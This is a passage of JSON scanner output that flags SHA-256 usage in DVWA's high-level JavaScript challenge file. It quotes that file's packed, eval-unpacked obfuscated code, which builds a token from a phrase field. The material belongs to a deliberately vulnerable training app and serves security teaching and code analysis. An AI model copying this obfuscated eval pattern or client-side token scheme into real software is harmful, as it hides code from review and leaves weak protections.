t;&gt;&gt;17)|(v&lt;&lt;15))^((v&gt;&gt;&gt;19)|(v&lt;&lt;13))^(v&gt;&gt;&gt;10);l[j]=l[j-16]+1a+l[j-7]+1b&lt;&lt;0}1D=b&amp;c;1g(j=0;j&lt;1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o&lt;&lt;0;d=v+4p&lt;&lt;0}z{1B=4v;v=l[0]-4w;h=v-4G&lt;&lt;0;d=v+4D&lt;&lt;0}k.2j=1O}z{1a=((a&gt;&gt;&gt;2)|(a&lt;&lt;30))^((a&gt;&gt;&gt;13)|(a&lt;&lt;19))^((a&gt;&gt;&gt;22)|(a&lt;&lt;10));1b=((e&gt;&gt;&gt;6)|(e&lt;&lt;26))^((e&gt;&gt;&gt;11)|(e&lt;&lt;21))^((e&gt;&gt;&gt;25)|(e&lt;&lt;7));1B=a&amp;b;1j=1B^(a&amp;c)^1D;1h=(e&amp;f)^(~e&amp;g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v&lt;&lt;0;d=v+1f&lt;&lt;0}1a=((d&gt;&gt;&gt;2)|(d&lt;&lt;30))^((d&gt;&gt;&gt;13)|(d&lt;&lt;19))^((d&gt;&gt;&gt;22)|(d&lt;&lt;10));1b=((h&gt;&gt;&gt;6)|(h&lt;&lt;26))^((h&gt;&gt;&gt;11)|(h&lt;&lt;21))^((h&gt;&gt;&gt;25)|(h&lt;&lt;7));1Z=d&amp;a;1j=1Z^(d&amp;b)^1B;1h=(h&amp;e)^(~h&amp;f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v&lt;&lt;0;c=v+1f&lt;&lt;0;1a=((c&gt;&gt;&gt;2)|(c&lt;&lt;30))^((c&gt;&gt;&gt;13)|(c&lt;&lt;19))^((c&gt;&gt;&gt;22)|(c&lt;&lt;10));1b=((g&gt;&gt;&gt;6)|(g&lt;&lt;26))^((g&gt;&gt;&gt;11)|(g&lt;&lt;21))^((g&gt;&gt;&gt;25)|(g&lt;&lt;7));1V=c&amp;d;1j=1V^(c&amp;a)^1Z;1h=(g&amp;h)^(~g&amp;e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v&lt;&lt;0;b=v+1f&lt;&lt;0;1a=((b&gt;&gt;&gt;2)|(b&lt;&lt;30))^((b&gt;&gt;&gt;13)|(b&lt;&lt;19))^((b&gt;&gt;&gt;22)|(b&lt;&lt;10));1b=((f&gt;&gt;&gt;6)|(f&lt;&lt;26))^((f&gt;&gt;&gt;11)|(f&lt;&lt;21))^((f&gt;&gt;&gt;25)|(f&lt;&lt;7));1D=b&amp;c;1j=1D^(b&amp;d)^1V;1h=(f&amp;g)^(~f&amp;h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v&lt;&lt;0;a=v+1f&lt;&lt;0}k.C=k.C+a&lt;&lt;0;k.B=k.B+b&lt;&lt;0;k.E=k.E+c&lt;&lt;0;k.F=k.F+d&lt;&lt;0;k.J=k.J+e&lt;&lt;0;k.I=k.I+f&lt;&lt;0;k.H=k.H+g&lt;&lt;0;k.D=k.D+h&lt;&lt;0};N.Q.1e=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x201e=m[(C&gt;&gt;28)&amp;o]+m[(C&gt;&gt;24)&amp;o]+m[(C&gt;&gt;20)&amp;o]+m[(C&gt;&gt;16)&amp;o]+m[(C&gt;&gt;12)&amp;o]+m[(C&gt;&gt;8)&amp;o]+m[(C&gt;&gt;4)&amp;o]+m[C&amp;o]+m[(B&gt;&gt;28)&amp;o]+m[(B&gt;&gt;24)&amp;o]+m[(B&gt;&gt;20)&amp;o]+m[(B&gt;&gt;16)&amp;o]+m[(B&gt;&gt;12)&amp;o]+m[(B&gt;&gt;8)&amp;o]+m[(B&gt;&gt;4)&amp;o]+m[B&amp;o]+m[(E&gt;&gt;28)&amp;o]+m[(E&gt;&gt;24)&amp;o]+m[(E&gt;&gt;20)&amp;o]+m[(E&gt;&gt;16)&amp;o]+m[(E&gt;&gt;12)&amp;o]+m[(E&gt;&gt;8)&amp;o]+m[(E&gt;&gt;4)&amp;o]+m[E&amp;o]+m[(F&gt;&gt;28)&amp;o]+m[(F&gt;&gt;24)&amp;o]+m[(F&gt;&gt;20)&amp;o]+m[(F&gt;&gt;16)&amp;o]+m[(F&gt;&gt;12)&amp;o]+m[(F&gt;&gt;8)&amp;o]+m[(F&gt;&gt;4)&amp;o]+m[F&amp;o]+m[(J&gt;&gt;28)&amp;o]+m[(J&gt;&gt;24)&amp;o]+m[(J&gt;&gt;20)&amp;o]+m[(J&gt;&gt;16)&amp;o]+m[(J&gt;&gt;12)&amp;o]+m[(J&gt;&gt;8)&amp;o]+m[(J&gt;&gt;4)&amp;o]+m[J&amp;o]+m[(I&gt;&gt;28)&amp;o]+m[(I&gt;&gt;24)&amp;o]+m[(I&gt;&gt;20)&amp;o]+m[(I&gt;&gt;16)&amp;o]+m[(I&gt;&gt;12)&amp;o]+m[(I&gt;&gt;8)&amp;o]+m[(I&gt;&gt;4)&amp;o]+m[I&amp;o]+m[(H&gt;&gt;28)&amp;o]+m[(H&gt;&gt;24)&amp;o]+m[(H&gt;&gt;20)&amp;o]+m[(H&gt;&gt;16)&amp;o]+m[(H&gt;&gt;12)&amp;o]+m[(H&gt;&gt;8)&amp;o]+m[(H&gt;&gt;4)&amp;o]+m[H&amp;o];p(!k.x){1e+=m[(D&gt;&gt;28)&amp;o]+m[(D&gt;&gt;24)&amp;o]+m[(D&gt;&gt;20)&amp;o]+m[(D&gt;&gt;16)&amp;o]+m[(D&gt;&gt;12)&amp;o]+m[(D&gt;&gt;8)&amp;o]+m[(D&gt;&gt;4)&amp;o]+m[D&amp;o]}A\\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x202b=[(C&gt;&gt;24)&amp;u,(C&gt;&gt;16)&amp;u,(C&gt;&gt;8)&amp;u,C&amp;u,(B&gt;&gt;24)&amp;u,(B&gt;&gt;16)&amp;u,(B&gt;&gt;8)&amp;u,B&amp;u,(E&gt;&gt;24)&amp;u,(E&gt;&gt;16)&amp;u,(E&gt;&gt;8)&amp;u,E&amp;u,(F&gt;&gt;24)&amp;u,(F&gt;&gt;16)&amp;u,(F&gt;&gt;8)&amp;u,F&amp;u,(J&gt;&gt;24)&amp;u,(J&gt;&gt;16)&amp;u,(J&gt;&gt;8)&amp;u,J&amp;u,(I&gt;&gt;24)&amp;u,(I&gt;&gt;16)&amp;u,(I&gt;&gt;8)&amp;u,I&amp;u,(H&gt;&gt;24)&amp;u,(H&gt;&gt;16)&amp;u,(H&gt;&gt;8)&amp;u,H&amp;u];p(!k.x){2b.4A((D&gt;&gt;24)&amp;u,(D&gt;&gt;16)&amp;u,(D&gt;&gt;8)&amp;u,D&amp;u)}A\\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\\x201w=O\\x20Z(k.x?28:32);q\\x201i=O\\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\\x201w};w\\x201P(G,x,1v){q\\x20i,T=1c\\x20G;p(T===\\x272p\\x27){q\\x20L=[],W=G.W,M=0,r;1g(i=0;i&lt;W;++i){r=G.1Q(i);p(r&lt;R){L[M++]=r}z\\x20p(r&lt;2v){L[M++]=(2t|(r&gt;&gt;6));L[M++]=(R|(r&amp;V))}z\\x20p(r&lt;2A||r&gt;=2E){L[M++]=(2D|(r&gt;&gt;12));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}z{r=2C+(((r&amp;23)&lt;&lt;10)|(G.1Q(++i)&amp;23));L[M++]=(2X|(r&gt;&gt;18));L[M++]=(R|((r&gt;&gt;12)&amp;V));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}}G=L}z{p(T===\\x271n\\x27){p(G===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;G.1J===Z){G=O\\x202r(G)}z\\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}}p(G.W&gt;1k){G=(O\\x20N(x,1d)).S(G).27()}q\\x201F=[],2e=[];1g(i=0;i&lt;1k;++i){q\\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\\x20X})}}})();w\\x202y(e){1g(q\\x20t=\\x22\\x22,n=e.W-1;n&gt;=0;n--)t+=e[n];A\\x20t}w\\x202J(t,y=\\x224B\\x22){1m.1o(\\x221M\\x22).1r=1q(1m.1o(\\x221M\\x22).1r+y)}w\\x202B(e=\\x224E\\x22){1m.1o(\\x221M\\x22).1r=1q(e+1m.1o(\\x221M\\x22).1r)}w\\x202K(a,b){1m.1o(\\x221M\\x22).1r=2y(1m.1o(\\x222F\\x22).1r)}1m.1o(\\x222F\\x22).1r=\\x22\\x22;4u(w(){2B(\\x224M\\x22)},4N);1m.1o(\\x224P\\x22).4Q(\\x224R\\x22,2J);2K(\\x223O\\x22,44);&#39;,&#39;||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW&#39;,&#39;split&#39;];(function(c,d){var e=function(f){while(--f){c[&#39;push&#39;](c[&#39;shift&#39;]());}};e(++d);}(a,0x1f4));var b=function(c,d){c=c-0x0;var e=a[c];return e;};eval(function(d,e,f,g,h,i){h=function(j){return(j&lt;e?&#39;&#39;:h(parseInt(j/e)))+((j=j%e)&gt;0x23?String[b(&#39;0x0&#39;)](j+0x1d):j[b(&#39;0x1&#39;)](0x24));};if(!&#39;&#39;[b(&#39;0x2&#39;)](/^/,String)){while(f--){i[h(f)]=g[f]||h(f);}g=[function(k){if(&#39;wpA&#39;!==b(&#39;0x3&#39;)){return i[k];}else{while(f--){i[k(f)]=g[f]||k(f);}g=[function(l){return i[l];}];k=function(){return b(&#39;0x4&#39;);};f=0x1;}}];h=function(){return b(&#39;0x4&#39;);};f=0x1;};while(f--){if(g[f]){if(b(&#39;0x5&#39;)===b(&#39;0x6&#39;)){return i[h];}else{d=d[b(&#39;0x2&#39;)](new RegExp(&#39;\\x5cb&#39;+h(f)+&#39;\\x5cb&#39;,&#39;g&#39;),g[f]);}}}return d;}(b(&#39;0x7&#39;),0x3e,0x137,b(&#39;0x8&#39;)[b(&#39;0x9&#39;)](&#39;|&#39;),0x0,{}));\n\n",
        "startLocationLine": 1,
        "startLocationColumn": 7670,
        "endLocationLine": 1,
        "endLocationColumn": 7674
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "sha2",
        "excerpt": "var a=[&#39;fromCharCode&#39;,&#39;toString&#39;,&#39;replace&#39;,&#39;BeJ&#39;,&#39;\\x5cw+&#39;,&#39;Lyg&#39;,&#39;SuR&#39;,&#39;(w(){\\x273M\\x203L\\x27;q\\x201l=\\x273K\\x203I\\x203J\\x20T\\x27;q\\x201R=1c\\x202I===\\x271n\\x27;q\\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\\x202L=!1R&amp;&amp;1c\\x202M===\\x271n\\x27;q\\x202o=!Y.2S&amp;&amp;1c\\x202d===\\x271n\\x27&amp;&amp;2d.2Q&amp;&amp;2d.2Q.3S;p(2o){Y=3R}z\\x20p(2L){Y=2M}q\\x202G=!Y.3Q&amp;&amp;1c\\x202g===\\x271n\\x27&amp;&amp;2g.X;q\\x202s=1c\\x202l===\\x27w\\x27&amp;&amp;2l.3P;q\\x201y=!Y.3H&amp;&amp;1c\\x20Z!==\\x272T\\x27;q\\x20m=\\x273G\\x27.3z(\\x27\\x27);q\\x202w=[-3y,3x,3v,3w];q\\x20U=[24,16,8,0];q\\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\\x201E=[\\x271e\\x27,\\x2727\\x27,\\x271G\\x27,\\x272R\\x27];q\\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\\x204C.Q.2U.1I(1x)===\\x27[1n\\x201z]\\x27}}p(1y&amp;&amp;(Y.50||!Z.1N)){Z.1N=w(1x){A\\x201c\\x201x===\\x271n\\x27&amp;&amp;1x.1w&amp;&amp;1x.1w.1J===Z}}q\\x202m=w(1X,x){A\\x20w(s){A\\x20O\\x20N(x,1d).S(s)[1X]()}};q\\x202a=w(x){q\\x20P=2m(\\x271e\\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\\x20O\\x20N(x)};P.S=w(s){A\\x20P.1T().S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2m(T,x)}A\\x20P};q\\x202P=w(P,x){q\\x201S=2O(\\x222N(\\x271S\\x27)\\x22);q\\x201Y=2O(\\x222N(\\x271w\\x27).1Y\\x22);q\\x202n=x?\\x271H\\x27:\\x271q\\x27;q\\x202z=w(s){p(1c\\x20s===\\x272p\\x27){A\\x201S.2x(2n).S(s,\\x274S\\x27).1G(\\x271e\\x27)}z{p(s===2q||s===2T){1u\\x20O\\x201t(1l)}z\\x20p(s.1J===Z){s=O\\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\\x201S.2x(2n).S(O\\x201Y(s)).1G(\\x271e\\x27)}z{A\\x20P(s)}};A\\x202z};q\\x202k=w(1X,x){A\\x20w(G,s){A\\x20O\\x201P(G,x,1d).S(s)[1X]()}};q\\x202f=w(x){q\\x20P=2k(\\x271e\\x27,x);P.1T=w(G){A\\x20O\\x201P(G,x)};P.S=w(G,s){A\\x20P.1T(G).S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2k(T,x)}A\\x20P};w\\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\\x202h,T=1c\\x20s;p(T!==\\x272p\\x27){p(T===\\x271n\\x27){p(s===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;s.1J===Z){s=O\\x202r(s)}z\\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}2h=1d}q\\x20r,M=0,i,W=s.W,l=k.l;4t(M&lt;W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){l[i&gt;&gt;2]|=s[M]&lt;&lt;U[i++&amp;3]}}z{1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){r=s.1Q(M);p(r&lt;R){l[i&gt;&gt;2]|=r&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2v){l[i&gt;&gt;2]|=(2t|(r&gt;&gt;6))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2A||r&gt;=2E){l[i&gt;&gt;2]|=(2D|(r&gt;&gt;12))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z{r=2C+(((r&amp;23)&lt;&lt;10)|(s.1Q(++M)&amp;23));l[i&gt;&gt;2]|=(2X|(r&gt;&gt;18))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;12)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}}}k.2u=i;k.L+=i-k.1A;p(i&gt;=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L&gt;4r){k.2i+=k.L/2H&lt;&lt;0;k.L=k.L%2H}A\\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\\x20l=k.l,i=k.2u;l[16]=k.1C;l[i&gt;&gt;2]|=2w[i&amp;3];k.1C=l[16];p(i&gt;=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i&lt;&lt;3|k.L&gt;&gt;&gt;29;l[15]=k.L&lt;&lt;3;k.1W()};N.Q.1W=w(){q\\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j&lt;1k;++j){v=l[j-15];1a=((v&gt;&gt;&gt;7)|(v&lt;&lt;25))^((v&gt;&gt;&gt;18)|(v&lt;&lt;14))^(v&gt;&gt;&gt;3);v=l[j-2];1b=((v&gt;&gt;&gt;17)|(v&lt;&lt;15))^((v&gt;&gt;&gt;19)|(v&lt;&lt;13))^(v&gt;&gt;&gt;10);l[j]=l[j-16]+1a+l[j-7]+1b&lt;&lt;0}1D=b&amp;c;1g(j=0;j&lt;1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o&lt;&lt;0;d=v+4p&lt;&lt;0}z{1B=4v;v=l[0]-4w;h=v-4G&lt;&lt;0;d=v+4D&lt;&lt;0}k.2j=1O}z{1a=((a&gt;&gt;&gt;2)|(a&lt;&lt;30))^((a&gt;&gt;&gt;13)|(a&lt;&lt;19))^((a&gt;&gt;&gt;22)|(a&lt;&lt;10));1b=((e&gt;&gt;&gt;6)|(e&lt;&lt;26))^((e&gt;&gt;&gt;11)|(e&lt;&lt;21))^((e&gt;&gt;&gt;25)|(e&lt;&lt;7));1B=a&amp;b;1j=1B^(a&amp;c)^1D;1h=(e&amp;f)^(~e&amp;g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v&lt;&lt;0;d=v+1f&lt;&lt;0}1a=((d&gt;&gt;&gt;2)|(d&lt;&lt;30))^((d&gt;&gt;&gt;13)|(d&lt;&lt;19))^((d&gt;&gt;&gt;22)|(d&lt;&lt;10));1b=((h&gt;&gt;&gt;6)|(h&lt;&lt;26))^((h&gt;&gt;&gt;11)|(h&lt;&lt;21))^((h&gt;&gt;&gt;25)|(h&lt;&lt;7));1Z=d&amp;a;1j=1Z^(d&amp;b)^1B;1h=(h&amp;e)^(~h&amp;f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v&lt;&lt;0;c=v+1f&lt;&lt;0;1a=((c&gt;&gt;&gt;2)|(c&lt;&lt;30))^((c&gt;&gt;&gt;13)|(c&lt;&lt;19))^((c&gt;&gt;&gt;22)|(c&lt;&lt;10));1b=((g&gt;&gt;&gt;6)|(g&lt;&lt;26))^((g&gt;&gt;&gt;11)|(g&lt;&lt;21))^((g&gt;&gt;&gt;25)|(g&lt;&lt;7));1V=c&amp;d;1j=1V^(c&amp;a)^1Z;1h=(g&amp;h)^(~g&amp;e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v&lt;&lt;0;b=v+1f&lt;&lt;0;1a=((b&gt;&gt;&gt;2)|(b&lt;&lt;30))^((b&gt;&gt;&gt;13)|(b&lt;&lt;19))^((b&gt;&gt;&gt;22)|(b&lt;&lt;10));1b=((f&gt;&gt;&gt;6)|(f&lt;&lt;26))^((f&gt;&gt;&gt;11)|(f&lt;&lt;21))^((f&gt;&gt;&gt;25)|(f&lt;&lt;7));1D=b&amp;c;1j=1D^(b&amp;d)^1V;1h=(f&amp;g)^(~f&amp;h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v&lt;&lt;0;a=v+1f&lt;&lt;0}k.C=k.C+a&lt;&lt;0;k.B=k.B+b&lt;&lt;0;k.E=k.E+c&lt;&lt;0;k.F=k.F+d&lt;&lt;0;k.J=k.J+e&lt;&lt;0;k.I=k.I+f&lt;&lt;0;k.H=k.H+g&lt;&lt;0;k.D=k.D+h&lt;&lt;0};N.Q.1e=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x201e=m[(C&gt;&gt;28)&amp;o]+m[(C&gt;&gt;24)&amp;o]+m[(C&gt;&gt;20)&amp;o]+m[(C&gt;&gt;16)&amp;o]+m[(C&gt;&gt;12)&amp;o]+m[(C&gt;&gt;8)&amp;o]+m[(C&gt;&gt;4)&amp;o]+m[C&amp;o]+m[(B&gt;&gt;28)&amp;o]+m[(B&gt;&gt;24)&amp;o]+m[(B&gt;&gt;20)&amp;o]+m[(B&gt;&gt;16)&amp;o]+m[(B&gt;&gt;12)&amp;o]+m[(B&gt;&gt;8)&amp;o]+m[(B&gt;&gt;4)&amp;o]+m[B&amp;o]+m[(E&gt;&gt;28)&amp;o]+m[(E&gt;&gt;24)&amp;o]+m[(E&gt;&gt;20)&amp;o]+m[(E&gt;&gt;16)&amp;o]+m[(E&gt;&gt;12)&amp;o]+m[(E&gt;&gt;8)&amp;o]+m[(E&gt;&gt;4)&amp;o]+m[E&amp;o]+m[(F&gt;&gt;28)&amp;o]+m[(F&gt;&gt;24)&amp;o]+m[(F&gt;&gt;20)&amp;o]+m[(F&gt;&gt;16)&amp;o]+m[(F&gt;&gt;12)&amp;o]+m[(F&gt;&gt;8)&amp;o]+m[(F&gt;&gt;4)&amp;o]+m[F&amp;o]+m[(J&gt;&gt;28)&amp;o]+m[(J&gt;&gt;24)&amp;o]+m[(J&gt;&gt;20)&amp;o]+m[(J&gt;&gt;16)&amp;o]+m[(J&gt;&gt;12)&amp;o]+m[(J&gt;&gt;8)&amp;o]+m[(J&gt;&gt;4)&amp;o]+m[J&amp;o]+m[(I&gt;&gt;28)&amp;o]+m[(I&gt;&gt;24)&amp;o]+m[(I&gt;&gt;20)&amp;o]+m[(I&gt;&gt;16)&amp;o]+m[(I&gt;&gt;12)&amp;o]+m[(I&gt;&gt;8)&amp;o]+m[(I&gt;&gt;4)&amp;o]+m[I&amp;o]+m[(H&gt;&gt;28)&amp;o]+m[(H&gt;&gt;24)&amp;o]+m[(H&gt;&gt;20)&amp;o]+m[(H&gt;&gt;16)&amp;o]+m[(H&gt;&gt;12)&amp;o]+m[(H&gt;&gt;8)&amp;o]+m[(H&gt;&gt;4)&amp;o]+m[H&amp;o];p(!k.x){1e+=m[(D&gt;&gt;28)&amp;o]+m[(D&gt;&gt;24)&amp;o]+m[(D&gt;&gt;20)&amp;o]+m[(D&gt;&gt;16)&amp;o]+m[(D&gt;&gt;12)&amp;o]+m[(D&gt;&gt;8)&amp;o]+m[(D&gt;&gt;4)&amp;o]+m[D&amp;o]}A\\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x202b=[(C&gt;&gt;24)&amp;u,(C&gt;&gt;16)&amp;u,(C&gt;&gt;8)&amp;u,C&amp;u,(B&gt;&gt;24)&amp;u,(B&gt;&gt;16)&amp;u,(B&gt;&gt;8)&amp;u,B&amp;u,(E&gt;&gt;24)&amp;u,(E&gt;&gt;16)&amp;u,(E&gt;&gt;8)&amp;u,E&amp;u,(F&gt;&gt;24)&amp;u,(F&gt;&gt;16)&amp;u,(F&gt;&gt;8)&amp;u,F&amp;u,(J&gt;&gt;24)&amp;u,(J&gt;&gt;16)&amp;u,(J&gt;&gt;8)&amp;u,J&amp;u,(I&gt;&gt;24)&amp;u,(I&gt;&gt;16)&amp;u,(I&gt;&gt;8)&amp;u,I&amp;u,(H&gt;&gt;24)&amp;u,(H&gt;&gt;16)&amp;u,(H&gt;&gt;8)&amp;u,H&amp;u];p(!k.x){2b.4A((D&gt;&gt;24)&amp;u,(D&gt;&gt;16)&amp;u,(D&gt;&gt;8)&amp;u,D&amp;u)}A\\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\\x201w=O\\x20Z(k.x?28:32);q\\x201i=O\\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\\x201w};w\\x201P(G,x,1v){q\\x20i,T=1c\\x20G;p(T===\\x272p\\x27){q\\x20L=[],W=G.W,M=0,r;1g(i=0;i&lt;W;++i){r=G.1Q(i);p(r&lt;R){L[M++]=r}z\\x20p(r&lt;2v){L[M++]=(2t|(r&gt;&gt;6));L[M++]=(R|(r&amp;V))}z\\x